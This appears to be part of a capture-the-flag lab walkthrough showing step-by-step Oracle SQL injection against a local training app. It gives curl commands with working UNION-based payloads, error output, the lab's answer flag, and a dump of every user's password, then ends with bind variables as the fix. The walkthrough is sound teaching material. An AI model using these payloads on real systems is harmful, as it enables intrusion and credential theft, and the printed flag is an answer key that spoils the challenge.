<h4>Step 1: Test Normal Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab1" \<br> --data-urlencode "username=alice"<br><br>
        <span class="prompt">Input: </span>alice<br>
        <span class="prompt">SQL: </span>SELECT id, username, email FROM users WHERE username = 'alice'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 3<br>
        <strong>Username:</strong> alice<br>
        <strong>Email:</strong> alice@sqli-arena.local
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab1" \<br> --data-urlencode "username='"<br><br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>ORA-01756: quoted string not properly terminated</strong>
    </div>
</div>

<h4>Step 3: Determine Column Count</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab1" \<br> --data-urlencode "username=admin' ORDER BY 3 -- "<br>
        <span class="prompt">Input: </span>admin' ORDER BY 3 -- <br>
        <span class="prompt">Result: </span><strong>ID:</strong> 1 | <strong>Username:</strong> admin | <strong>Email:</strong> admin@sqli-arena.local (3 columns exist)<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab1" \<br> --data-urlencode "username=admin' ORDER BY 4 -- "<br>
        <span class="prompt">Input: </span>admin' ORDER BY 4 -- <br>
        <span class="prompt">Error: </span><strong>ORA-01785: ORDER BY item must be the number of a SELECT-list expression</strong><br>
        <span class="prompt">// 3 columns confirmed</span>
    </div>
</div>

<h4>Step 4: Test UNION with FROM DUAL</h4>
<p>
    <strong>Critical Oracle difference:</strong> Every SELECT must have a FROM clause.
    Use <code>FROM DUAL</code> for constant values.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. FROM DUAL Requirement</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab1" \<br> --data-urlencode "username=' UNION SELECT 1, 'test', 'x' FROM DUAL -- "<br>
        <span class="prompt">Input: </span>' UNION SELECT 1, 'test', 'x' FROM DUAL -- <br>
        <span class="prompt">Output: </span><strong>ID:</strong> 1 | <strong>Username:</strong> test | <strong>Email:</strong> x (FROM DUAL works!)<br><br>
        <span class="prompt">// Without FROM DUAL:</span><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "username=' UNION SELECT NULL, NULL, NULL -- "<br>
        <span class="prompt">Error: </span><strong>ORA-00923: FROM keyword not found where expected</strong>
    </div>
</div>

<h4>Step 5: Extract the Admin Password</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab1" \<br> --data-urlencode "username=admin' UNION SELECT 1, password, email FROM users WHERE username='admin' -- "<br><br>
        <span class="prompt">Input: </span>admin' UNION SELECT 1, password, email FROM users WHERE username='admin' -- <br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 | <strong>Username:</strong> admin | <strong>Email:</strong> admin@sqli-arena.local<br>
        <strong>ID:</strong> 1 | <strong>Username:</strong> <strong>FLAG{or_un10n_fr0m_du4l}</strong> | <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<h4>Step 6: Dump All Users with Concatenation</h4>
<p>Oracle uses <code>||</code> for string concatenation (same as PostgreSQL).</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Full User Dump</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab1" \<br> --data-urlencode "username=' UNION SELECT id, username || ':' || password, email FROM users -- "<br><br>
        <span class="prompt">Input: </span>' UNION SELECT id, username || ':' || password, email FROM users -- <br><br>
        <span class="prompt">Output:</span><br>
        admin:<strong>FLAG{or_un10n_fr0m_du4l}</strong><br>
        jdoe:p@ssw0rd123<br>
        alice:alice2024!<br>
        bob:bobSecure#1<br>
        charlie:charL13!!
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the admin password and paste it into the verification form:
    <code>FLAG{or_un10n_fr0m_du4l}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab1" \<br> --data-urlencode "username=admin' UNION SELECT 1, password, email FROM users WHERE username='admin' -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Username:</strong> FLAG{or_un10n_fr0m_du4l}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Oracle requires every SELECT to have a FROM clause. When injecting
    constant values, use <code>FROM DUAL</code>. Oracle uses <code>WHERE ROWNUM &lt;= N</code> instead
    of <code>LIMIT</code>, and <code>||</code> for string concatenation. The secure fix is to use
    bind variables: <code>oci_bind_by_name($stmt, ':username', $input)</code>.
</div>
